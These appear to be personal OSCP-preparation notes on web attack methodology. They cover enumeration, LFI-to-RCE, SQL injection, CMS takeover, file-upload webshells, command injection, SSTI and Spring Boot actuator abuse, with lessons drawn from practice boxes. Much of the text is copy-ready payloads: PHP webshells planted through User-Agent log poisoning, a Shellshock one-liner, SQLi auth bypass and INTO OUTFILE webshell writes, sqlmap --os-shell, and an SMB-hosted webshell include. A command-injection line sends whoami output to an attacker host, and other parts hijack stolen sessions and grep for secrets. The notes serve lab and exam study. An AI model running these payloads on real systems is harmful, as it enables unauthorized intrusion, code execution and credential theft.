---
tags: [methodology, web, oscp]
---

# 02 — Web Attacks

> Back to [[00 - Index (MOC)]]. Web is the most common OSCP foothold. Enumerate hard, identify the exact app + version, then match the attack.

## Enumerate first
```bash
whatweb http://$IP; curl -sI http://$IP            # tech stack + VERSION + headers
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,aspx,bak
ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w .../subdomains-top1million-5000.txt -fs <baseline>   # vhosts
nikto -h http://$IP
```
Manual checks:
- [ ] Page **source** + JS files + HTML comments
- [ ] `/robots.txt`, `/sitemap.xml`, `/.git/`, `/.env`, backup files (`.bak`, `~`, `.old`, `.zip`)
- [ ] Login pages → default creds, then brute → [[06 - Password Attacks]]
- [ ] Identify **CMS + version** → `searchsploit`

> **⚠️ Extensions decide what you find — a default "IIS Windows Server" page is NOT an empty box.** `gobuster`/`feroxbuster` only report files whose extension you pass via `-x`. Code extensions alone (`php,aspx,asp`) will **miss document files that are the real breadcrumb**. Always add document types:
> ```bash
> feroxbuster -u http://$IP -w .../raft-medium-directories.txt -x aspx,asp,php,txt,pdf,docx,xlsx,pptx,zip,bak,config
> ```
> A **`.pdf`/`.docx`** you find is client-side recon gold → run `exiftool -a -u file.pdf` for **author, Office version, OS** → feeds a macro/library-file phish (see OSCP note *12 — Client-side Attacks*). *Lesson from ADMIN capstone: the default IIS page hid a `.pdf`; adding `-x pdf,txt` surfaced it.*

### Extension cheat-sheet (`-x` values)
**Sensible default (run this, then tailor to the stack):**
```
php,asp,aspx,jsp,html,js,json,xml,txt,log,conf,config,env,bak,old,pdf
```
| Category | Extensions |
|---|---|
| Web pages | `html htm php asp aspx jsp` |
| Backend / API | `json xml yaml yml` |
| Config | `conf config ini env` |
| Templates | `twig jinja hbs ejs` |
| Source | `js ts jsx tsx py rb java` |
| Docs / data | `txt csv log bak old pdf docx xlsx` |
| **Leaky files (enum gold)** | `.env .bak .old .orig .save .tmp .log .conf .config .json .xml` — deployment/creds/config disclosure |

**Tailor to the detected stack** (from `whatweb`/headers): Node.js → prioritise `js ts json env` over `php jsp`; PHP → `php phtml php5 inc`; .NET/IIS → `aspx asp asmx config`; Java → `jsp do action`.

> **Don't forget extensionless routes.** Modern frameworks route `/api/users`, `/admin`, `/login`, `/health` with **no extension** — always run a **directory** pass (no `-x`) *as well as* the extension pass, or you'll miss the whole API surface.

Tools: [[Gobuster]] · [[ffuf]] · [[Burp Suite]] · [[ZAP]]

---

## Pick the attack by what you found

| Signal | Likely attack | Go to |
|--------|---------------|-------|
| CMS (WordPress/Joomla/Drupal) | plugin/theme CVE, cred brute | [[WordPress]] |
| Input reflected in page | XSS | [[XSS]] |
| Input in a query / error leaks SQL | SQL injection | [[SQLi]] |
| `?file=`, `?page=`, `?include=` | LFI/RFI → RCE | ↓ below |
| Upload form | malicious upload → webshell | ↓ below |
| `ping`/`dns`/`convert` style feature | command injection | ↓ below |
| `{{7*7}}` renders `49` | SSTI → RCE | ↓ below |
| URL/fetch parameter | SSRF | [[gopher]] |
| PDF generator / name field | PDF/HTML injection | [[PDF-Injection]] |
| Spring Boot error page (`Whitelabel Error Page`) | actuator endpoints → session hijack / cred leak | ↓ below |
| Known product + version | public CVE / RCE | `searchsploit` |

---

## Headers are input too — don't forget them
Every attack class you test in a parameter is also testable in a **header**. If the field is a form input, it is *obvious* input; headers are the input people forget, and OSCP boxes lean on that.

**Which header → which attack:**
```
User-Agent      → logged by the server → LFI log poisoning → RCE (most common); SQLi if logged to DB; stored XSS in admin log viewers
X-Forwarded-For → often logged / trusted as client IP → SQLi, log-poisoning, stored XSS, IP-based auth bypass
Referer         → logged → same as User-Agent; stored XSS in analytics/referrer panels
Cookie          → session/tracking values hit the DB → SQLi, deserialization
Host            → SSRF, password-reset poisoning, cache poisoning, vhost routing / auth bypass
X-Real-IP / X-Client-IP / X-Originating-IP / X-Forwarded-Host → IP-based auth bypass (`X-Forwarded-For: 127.0.0.1` to reach admin-only-from-localhost pages)
Authorization / custom X-* → app-specific parsing bugs
```

**How to test — put the payload in the header, not just the URL.** In Burp Repeater edit any header directly; with curl:
```bash
curl http://$IP/ -H "User-Agent: ' OR 1=1-- -"                          # SQLi in UA
curl http://$IP/ -H "User-Agent: <?php system(\$_GET['c']); ?>"          # seed LFI log poison, then include the log
curl http://$IP/ -H "X-Forwarded-For: 127.0.0.1"                        # IP allowlist bypass to admin pages
curl http://$IP/ -H "X-Forwarded-For: '+(select sleep(5))+'"           # blind SQLi in XFF
sqlmap -u http://$IP/ --headers="X-Forwarded-For: 1" -p "X-Forwarded-For" --level=5   # level>=3 makes sqlmap test UA/Referer, level 5 adds Host/others
```
> **`sqlmap` only tests headers at `--level 3+`** (UA/Referer) and `--level 5` (Host, etc.). Default level 1 tests GET/POST params only — a header-only SQLi looks "not injectable" until you raise the level.
> **Shellshock (CVE-2014-6271):** a CGI endpoint (`.cgi`, `.sh`, `/cgi-bin/`) runs bash → header value reaches bash env → RCE: `curl http://$IP/cgi-bin/x -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'"`. Any header works; User-Agent is the classic.

Reminder for LFI specifically: the User-Agent log-poisoning chain is in [[LFI → RCE]] above — read the log via LFI first to confirm your header value lands in it.


## LFI → RCE
```bash
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php      # read PHP source
?file=/var/log/apache2/access.log                                  # log poisoning
?file=data://text/plain;base64,<b64 php>                           # data wrapper
?file=expect://id                                                  # if expect enabled
```
Log-poisoning RCE: inject `<?php system($_GET['c']); ?>` into User-Agent, then include the log.
Windows targets: `..\..\..\..\windows\win.ini`, `C:\xampp\apache\logs\access.log`.

> **Lesson (Sniper):** relative traversal (`../../../windows/win.ini`) got a clean 404 while the **absolute path** (`/windows/win.ini`, no `../` at all) worked immediately. If `../` traversal is silently swallowed/blocked, always try the bare absolute path before concluding LFI is dead — some `include()` patterns strip/normalize `..` but pass an already-rooted path straight through.

**Your own client can eat the payload — check before concluding "not vulnerable".** curl and browsers apply RFC 3986 `remove_dot_segments` to the URL **path**, collapsing `..` locally; curl's parser decodes `%2e` first, so encoding alone does not survive either. Query strings are never normalized.

| Payload sits in | Mangled? | Delivery |
|---|---|---|
| Query string — `?file=../../etc/passwd` | No | anything, browser included |
| URL path — `/cgi-bin/../../etc/passwd` | **Yes** | `curl --path-as-is`, or Burp Repeater (sends the request line verbatim) |

```bash
curl -v --path-as-is "http://$IP/cgi-bin/%2e%2e/%2e%2e/etc/passwd" 2>&1 | grep '^> GET'   # confirm what was sent
```

> **Lesson (PWK Apache 2.4.49 / CVE-2021-41773):** the NSE script reported VULNERABLE while curl returned 404 — same host, same port, same payload. The only difference was `--path-as-is`. A 404 from a path-based traversal proves nothing until you have seen the raw request line.

**Whitelist vs. filter, fast diagnosis:** request a *variant* of a known-good value (`?file=./known-good.php` instead of `known-good.php`). Same content back = no exact whitelist, keep pushing traversal/encoding. Same error page back = real whitelist (`in_array` exact match) — traversal is a dead end, look elsewhere.

**No traversal working at all? Try PHP session file poisoning (LFI → RCE without ever needing `../`):**
1. Register/login on the app (any account) → grab `PHPSESSID` from cookies/devtools.
2. PHP stores sessions server-side at a predictable path: `/var/lib/php/sessions/sess_<id>` (Linux) or `C:\Windows\Temp\sess_<id>` (Windows/IIS). Confirm you can read it via the LFI: `?file=/windows/temp/sess_<PHPSESSID>`.
3. The session file stores whatever the app put in `$_SESSION` (often your `username`, serialized: `username|s:5:"guest";`). **Re-register with a PHP payload as the username**, e.g. `<?=`whoami`?>` (backtick = PHP `exec()`), then log back in — the session file is overwritten with your payload.
4. Re-request the LFI on the same session file → your payload executes with the web server's identity (`NT AUTHORITY\IUSR` on IIS, `www-data` on Apache).

**Blacklisted characters in the username/input field?** Brute-force which symbols are blocked, then encode around them:
```python
import requests, string
for c in string.punctuation:
    u = "A"*5 + c
    requests.post(register_url, data={'email':'t@t.t','username':u,'password':u,'submit':' '})
    r = requests.post(login_url, data={'username':u,'password':u,'submit':' '})
    if "incorrect" in r.text: print("blocked:", c)
```
If `$ & ' ( - . ; [ _` (or similar) are blocked, raw shell payloads won't fit — encode the whole command as a **PowerShell `-enc` blob** instead (Windows default locale is UTF-16LE, not UTF-8):
```bash
echo "whoami" | iconv -t utf-16le | base64
# → <?=`powershell /enc <b64>`?>
```
This sidesteps almost any character blacklist since the payload is pure base64 alphanumerics.

**RFI via SMB instead of HTTP** (bypasses `allow_url_include` restrictions that block `http://` RFI): host a webshell on an SMB share you control and include it by UNC path.
```bash
# Linux: right-click a folder → Sharing → Share this folder (or `net usershare`)
# webshell.php: <?=`$_GET[0]`?>
curl "http://$IP/blog/?lang=//$LHOST/share/shell.php&0=whoami"
```

## SQLi (detect → fingerprint → dump → RCE)
Full playbook in [[SQLi]]. Fast path:
```sql
'                      -- error / layout break = injectable
' OR 1=1-- //          -- auth bypass (returns first user, usually admin)
' ORDER BY 1-- //      -- increment until error = column count (UNION)
' UNION SELECT null,null,database(),user(),@@version-- //   -- col 1 is usually int id → pad left, push strings right
' UNION SELECT null,table_name,column_name,table_schema,null FROM information_schema.columns WHERE table_schema=database()-- //
```
Error-based read primitive (MySQL): `' or 1=1 in (select @@version)-- //` — the type-mismatch error echoes the value.
Blind: signal comes from the **app**, not the DB — boolean (`' AND 1=1`) or time (`' AND SLEEP(5)`, MSSQL `'; WAITFOR DELAY '0:0:5'`).

**RCE — fingerprint first, the route differs by DBMS:**
```sql
-- MSSQL: show advanced options → RECONFIGURE → xp_cmdshell → RECONFIGURE, then EXEC xp_cmdshell 'whoami'
-- MySQL: ' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/sh.php"-- //  (needs FILE priv + writable web dir)
```
```bash
# sqlmap — but it is LOUD, and blind/time-based is one bit per request
sqlmap -r req.txt -p <param> --batch --dump
sqlmap -r req.txt -p <param> --technique=BEU --level=5 --risk=3   # force boolean/error/UNION, skip slow time-based
sqlmap -r req.txt -p <param> --os-shell --web-root "/var/www/html/tmp"   # UNION vector, not time-based
```
> **When a faster channel exists on the same app, use it.** Blind is slow because it is one bit per request — inherent, not a missing flag. If a UNION or error-based endpoint exists, point tools there instead of the blind one. `INTO OUTFILE` throws a type error but still writes — request the file to confirm.
> Connect direct on 3306/1433 → [[MySQL]] / [[MSSQL]]. Detail + all DBMS variants: [[SQLi]] · OSCP [[10-sql-injection-attacks]].


## CMS (WordPress / Joomla / Drupal)
Fingerprint (`whatweb`, generator meta, `wp-content/`, `/administrator/`, `CHANGELOG.txt`) → **identify version → `searchsploit`**. The core is rarely the hole; **plugins/themes/modules and weak admin creds are.**
```bash
# WordPress — full playbook in [[WordPress]]
wpscan --url http://$IP --enumerate u,vp,vt              # users, vuln plugins/themes
wpscan --url http://$IP -U users.txt -P rockyou.txt      # brute after enumerating users
curl -s http://$IP/wp-json/wp/v2/users                   # REST user list (often open)
# admin → RCE: Appearance → Theme Editor → edit 404.php → webshell → /wp-content/themes/<t>/404.php?cmd=id

# Joomla
droopescan scan joomla -u http://$IP ; curl -s http://$IP/administrator/manifests/files/joomla.xml   # version
# admin → RCE: Templates → edit a .php template → browse to it

# Drupal
droopescan scan drupal -u http://$IP ; curl -s http://$IP/CHANGELOG.txt | head   # version
# Drupalgeddon2 (CVE-2018-7600) / Drupalgeddon3 for <7.58 / <8.5.1 — unauth RCE, metasploit or PoC
```
> **The CMS pattern is always the same:** version → known plugin/module CVE, or weak creds → **admin panel has a code editor** (theme/template) → paste webshell → RCE. `wp-config.php` / Joomla `configuration.php` / Drupal `settings.php` hold DB creds to **reuse everywhere** ([[06 - Password Attacks]]).
> Detail: [[WordPress]] · OSCP [[08-introduction-to-web-application-attacks]].


## File upload → webshell
- Bypass extension filters: `.phtml .php5 .phar`, double ext `shell.php.jpg`, null byte (old), case `.pHp`
- Fake magic bytes (`GIF89a;` prefix), fix `Content-Type: image/png`
- Webshells: `/usr/share/webshells/php/simple-backdoor.php`, `cmdasp.aspx` (IIS)
> **Lesson (Flight):** a **cmd-exec** webshell (no shellcode) sails past Defender where an msfvenom reverse-shell aspx gets killed. Prefer cmd webshell → then launch shell/potato from it.

## Command injection
```bash
; id      | id      || id      & id      `id`      $(id)      %0aid
# blind → time or OOB
; ping -c3 $LHOST        # watch tcpdump
; curl http://$LHOST/$(whoami)
```

## SSTI (identify engine, then RCE)
```
{{7*7}} ${7*7} <%= 7*7 %> #{7*7}      # 49 = vulnerable
# Jinja2 RCE:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Tool: `tplmap`, or PayloadsAllTheThings SSTI.

## Spring Boot / Java apps

`/error` returning a `Whitelabel Error Page` = Spring Boot. Fuzz with the Spring-specific wordlist:
```bash
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
```

If the wordlist isn't installed:
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/spring-boot.txt -O /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
```

Key actuator endpoints:

| Endpoint | What it leaks |
|----------|--------------|
| `/actuator` | Lists all enabled endpoints |
| `/actuator/sessions` | Active session IDs — steal and set as cookie → bypass login |
| `/actuator/env` | Config properties, sometimes plaintext creds |
| `/actuator/mappings` | All routes — find hidden admin/API paths |
| `/actuator/heapdump` | JVM heap — extract with `strings` or VisualVM for passwords, tokens |
| `/actuator/beans` | All Spring beans — shows internal components |

Actuator not at root → try `/api/actuator`, `/admin/actuator`, `/manage/actuator`.

Session hijack: `/actuator/sessions` returns user → session ID mapping. Copy the session value → set it as your cookie in browser devtools → navigate to admin panel.

## SSRF
Reach internal services / cloud metadata (`http://169.254.169.254/`). Gopher for raw protocol smuggling → [[gopher]].

---

## Config / secret mining (once you can read files)
Web configs leak DB creds that get **reused** for SSH/system users:
```bash
grep -riE "password|passwd|secret|api[_-]?key|token" /var/www 2>/dev/null
# common loot
config.php  wp-config.php  .env  web.config  application.properties  hibernate.cfg.xml
```
> **Lesson (Editor/XWiki):** `configuration.properties` `validationKey`/`encryptionKey` forge auth cookies — but that's web-side only. The real host win was a DB/user cred reused for the `oliver` user → then group-based root. Always pivot found creds to the OS.

---

## After web RCE → get a real shell
1. Trigger reverse shell (cmd webshell → nc/powershell) → [[07 - Shells & File Transfers]]
2. Stabilize TTY
3. Local enum → [[03 - Windows Privilege Escalation]] / [[04 - Linux Privilege Escalation]]
> **Web-root pivot:** if user A can write into a web dir that executes as user B / app-pool, drop a shell there → RCE as B. IIS app pools carry `SeImpersonate` → potato → SYSTEM (see [[03 - Windows Privilege Escalation]]).

---

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks web: https://book.hacktricks.xyz/pentesting-web
- PortSwigger Web Security Academy: https://portswigger.net/web-security
